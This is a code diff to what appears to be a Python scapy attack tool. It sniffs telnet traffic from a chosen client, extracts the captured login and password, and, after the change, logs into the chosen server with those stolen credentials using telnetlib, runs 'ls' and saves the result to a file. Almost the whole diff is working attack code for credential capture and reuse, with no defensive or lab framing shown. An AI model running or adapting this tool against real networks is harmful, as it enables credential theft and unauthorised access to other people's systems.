@@ -1,5 +1,5 @@
 from scapy.all import *
-import os
+import telnetlib
 from .utils import get_mac
 from pip._vendor.distlib.compat import raw_input
 
@@ -11,8 +11,8 @@ try:
     interface = raw_input("Enter Desired Interface [eth0]: ")
     if interface == "":
         interface = "eth0"
-    client_ip = raw_input("[*] client IP: ")
-    server_ip = raw_input("[*] server IP: ")
+    target1_ip = raw_input("[*] Enter Client IP: ")
+    target2_ip = raw_input("[*] Enter Server IP: ")
 except KeyboardInterrupt:
     print("\n[*] User Requested Shutdown")
     print("[*] Exiting...")
@@ -54,17 +54,33 @@ def get_telnet_credentials(pkt):
 
 
 def use_telnet_credentials(login, password):
-    global server_ip
+    global target2_ip
+    
     str_login = ""
     str_password = ""
+    
     for i in login:
         str_login = str_login + i
     for j in password:
         str_password = str_password + j
+        
     print("user login: " + str_login + "| user password: " + str_password)
-    os.system('telnet ' + server_ip)
+    
+    try:
+        tn = telnetlib.Telnet(target2_ip)
+        tn.read_until(b"login: ",2)
+        tn.write(str_login.encode('ascii') + b"\n")
+        tn.read_until(b"Password: ",2)
+        tn.write(str_password.encode('ascii') + b"\n")
+        tn.write(b"ls\n")
+        tn.write(b"exit\n")
+        read_data = tn.read_all()
+        with open('output_data.txt', 'w') as output:
+            output.write(str(read_data))
+    except:
+        print("telnet connection with remote server couldn't be established")
 
 
-client_mac = get_mac(client_ip)
+client_mac = get_mac(target1_ip)
 sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
       count=0)
